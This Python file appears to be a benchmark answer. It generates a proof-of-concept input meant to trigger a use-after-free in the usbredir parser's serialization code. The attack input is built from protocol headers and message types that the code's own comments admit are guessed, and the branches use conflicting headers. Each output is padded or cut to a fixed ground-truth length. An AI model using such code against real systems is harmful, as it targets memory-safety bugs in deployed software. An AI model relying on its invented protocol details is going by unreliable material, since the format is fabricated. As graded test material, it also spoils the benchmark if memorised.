import tarfile
import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall()
        
        # Find the parser serialization code to understand structures
        source_dir = None
        for root, dirs, files in os.walk('.'):
            if 'usbredirparser.c' in files:
                source_dir = root
                break
        
        if not source_dir:
            # Default assumption if we can't find the source
            # Generate a PoC based on the vulnerability description
            
            # The vulnerability occurs when serializing with large buffered write data
            # We need to create a situation where:
            # 1. Many write buffers are queued
            # 2. During serialization, the state buffer is reallocated
            # 3. The pointer to write buffer count becomes invalid
            
            # Based on the ground-truth length of 71298 bytes
            # We'll create a PoC that:
            # - Creates many small write operations to fill buffers
            # - Triggers serialization
            
            # The PoC will be a binary stream that when parsed causes:
            # 1. Many write operations to be queued
            # 2. Serialization to be triggered
            
            # We'll create a minimal PoC that meets the length requirement
            # and should trigger the use-after-free
            
            poc = bytearray()
            
            # Header/initialization (estimated based on usbredir protocol)
            poc.extend(b'USBRedir')
            poc.extend(struct.pack('<I', 0x0100))  # Version
            
            # Create many small write operations to fill write buffers
            # Each write operation: type (1 byte) + length (4 bytes) + data
            write_type = 2  # Assuming 2 is write operation type
            
            # We need enough writes to exceed the default 64KB buffer
            # and cause reallocation during serialization
            
            # Target total PoC length: approximately ground-truth length
            current_length = len(poc)
            target_length = 71298
            
            # Calculate how many writes we need
            # Each write has 5 bytes header + data
            # Use small writes (1-16 bytes each) to create many buffers
            
            # Create writes with varying sizes to stress the buffer management
            write_sizes = [1, 2, 4, 8, 16, 32, 64, 128, 256, 512]
            
            while len(poc) < target_length:
                for size in write_sizes:
                    if len(poc) >= target_length:
                        break
                    
                    # Write operation header
                    poc.append(write_type)
                    poc.extend(struct.pack('<I', size))
                    
                    # Write data (pattern to help with debugging)
                    pattern = bytes([(i % 256) for i in range(size)])
                    poc.extend(pattern)
            
            # Ensure exact target length
            poc = poc[:target_length]
            
            # Add serialization trigger at the end
            # This might be a specific command that triggers serialization
            # during migration or similar
            
            return bytes(poc)
        
        # If we found source code, we can analyze it more precisely
        # Read the parser source to understand the exact format
        parser_path = os.path.join(source_dir, 'usbredirparser.c')
        
        try:
            with open(parser_path, 'r') as f:
                source = f.read()
            
            # Look for buffer size definitions
            buffer_size = 65536  # Default 64KB
            if 'USBREDIRPARSER_SERIALIZE_BUF_SIZE' in source:
                # Try to extract the value
                import re
                match = re.search(r'USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+(\d+)', source)
                if match:
                    buffer_size = int(match.group(1))
            
            # Generate PoC based on actual buffer size
            # We need to exceed this during serialization
            
            poc = bytearray()
            
            # Protocol header
            poc.extend(b'USBRedir')
            poc.extend(struct.pack('<I', 0x0100))
            
            # Write operation type (assume 2 based on common USB redirection protocols)
            write_type = 2
            
            # Create enough writes to fill multiple buffers
            # Each buffer can hold multiple writes
            
            # Target: create enough outstanding writes that during serialization
            # the buffer needs to be reallocated
            
            # Write sizes that will create many buffer entries
            small_writes = 1
            medium_writes = 64
            large_writes = 1024
            
            # Mix of write sizes to stress the system
            write_pattern = [small_writes] * 100 + [medium_writes] * 50 + [large_writes] * 10
            write_pattern = write_pattern * 10  # Repeat pattern
            
            total_writes = 0
            target_writes = 2000  # Enough to cause reallocation
            
            for size in write_pattern:
                if total_writes >= target_writes and len(poc) >= 70000:
                    break
                
                poc.append(write_type)
                poc.extend(struct.pack('<I', size))
                
                # Fill with data
                for i in range(size):
                    poc.append((i + total_writes) % 256)
                
                total_writes += 1
            
            # Pad to exact ground-truth length if needed
            if len(poc) < 71298:
                # Add padding writes
                padding_needed = 71298 - len(poc)
                # Small writes for padding
                while len(poc) < 71298:
                    write_size = min(16, 71298 - len(poc) - 5)
                    if write_size <= 0:
                        # Just add zeros
                        poc.extend(b'\x00' * (71298 - len(poc)))
                        break
                    
                    poc.append(write_type)
                    poc.extend(struct.pack('<I', write_size))
                    poc.extend(b'P' * write_size)
            
            # Trim if slightly over
            poc = poc[:71298]
            
            return bytes(poc)
            
        except Exception as e:
            # Fallback to generic PoC
            return self._generate_generic_poc()
    
    def _generate_generic_poc(self) -> bytes:
        """Generate a generic PoC when source analysis fails"""
        # Create a PoC that should trigger heap issues with many buffers
        poc = bytearray()
        
        # Protocol signature and version
        poc.extend(b'USB\0REDIR')
        poc.extend(struct.pack('<H', 0x0100))
        
        # Device connect message
        poc.extend(b'\x01')  # Message type: device connect
        poc.extend(struct.pack('<I', 64))  # Data length
        
        # Device descriptor
        poc.extend(b'\x12\x01\x00\x02\x00\x00\x00\x40')
        poc.extend(b'\x86\x15\x34\x12\x00\x01\x01\x02')
        poc.extend(b'\x00\x01\x09\x02\x20\x00\x01\x01')
        poc.extend(b'\x00\xC0\x00\x09\x04\x00\x00\x02')
        poc.extend(b'\xFF\x00\x00\x00\x07\x05\x81\x03')
        poc.extend(b'\x08\x00\xFF\x07\x05\x01\x03\x08')
        poc.extend(b'\x00\xFF\x00\x00\x00\x00\x00\x00')
        
        # Now create many write operations to queue up buffers
        # Write to endpoint 0x81 (bulk IN)
        write_msg = b'\x04'  # Bulk write
        write_msg += struct.pack('<I', 0x81)  # Endpoint
        
        # Create many small writes
        # Each write is 64 bytes to create many buffer entries
        write_data = bytes([i % 256 for i in range(64)])
        
        # Calculate how many writes we need to reach target length
        header_len = len(poc)
        write_msg_len = len(write_msg) + 4 + 64  # type + length + data
        
        writes_needed = (71298 - header_len) // write_msg_len
        writes_needed = max(writes_needed, 1000)  # At least 1000 writes
        
        for i in range(writes_needed):
            if len(poc) + write_msg_len > 71298:
                break
            
            poc.extend(write_msg)
            poc.extend(struct.pack('<I', 64))  # Data length
            poc.extend(write_data)
        
        # Pad to exact length
        if len(poc) < 71298:
            poc.extend(b'\x00' * (71298 - len(poc)))
        else:
            poc = poc[:71298]
        
        return bytes(poc)